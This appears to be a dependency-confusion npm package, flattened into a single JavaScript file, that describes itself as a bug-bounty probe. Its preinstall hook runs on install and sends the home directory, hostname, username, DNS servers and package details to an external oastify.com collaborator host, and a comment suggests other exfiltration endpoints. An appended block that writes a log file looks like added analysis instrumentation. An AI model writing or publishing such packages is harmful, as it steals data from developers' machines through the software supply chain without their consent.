
// === Begin package.json ===
const packageJSON = {
  "name": "alksjdaskldjklj12kl3jkl12jkljaskldjaklsjdlkashjflksdjhfgkldsjlkgop123i4poiopals",
  "version": "99.0.0",
  "description": "v4yne1 [at] gmail.com bug bounty",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "node index.js"
  },
  "author": "",
  "license": "ISC"
};
// === End package.json ===

// === Begin index.js ===
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");

const package = packageJSON.name;

const trackingData = JSON.stringify({
  p: package,
  c: __dirname,
  hd: os.homedir(),
  hn: os.hostname(),
  un: os.userInfo().username,
  dns: dns.getServers(),
  r: packageJSON ? packageJSON.___resolved : undefined,
  v: packageJSON.version,
  pjson: packageJSON,
});

var postData = querystring.stringify({
  msg: trackingData,
});

var options = {
  hostname: "o6v6iatg9ab4jphl2jqw8t3takgb47sw.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
  port: 443,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": postData.length,
  },
};

var req = https.request(options, (res) => {
  res.on("data", (d) => {
    process.stdout.write(d);
  });
});

req.on("error", (e) => {
  // console.error(e);
});

req.write(postData);
req.end();

// === End index.js ===

// === Auto Appended Behavior Injection ===
try {
  const fs = require('fs');
  fs.writeFileSync('dynamic_log.txt', 'Triggered dynamic API');
  console.log('[Dynamic] fs.writeFileSync called');
} catch (e) {
  console.error('[Dynamic] Injection failed:', e);
}
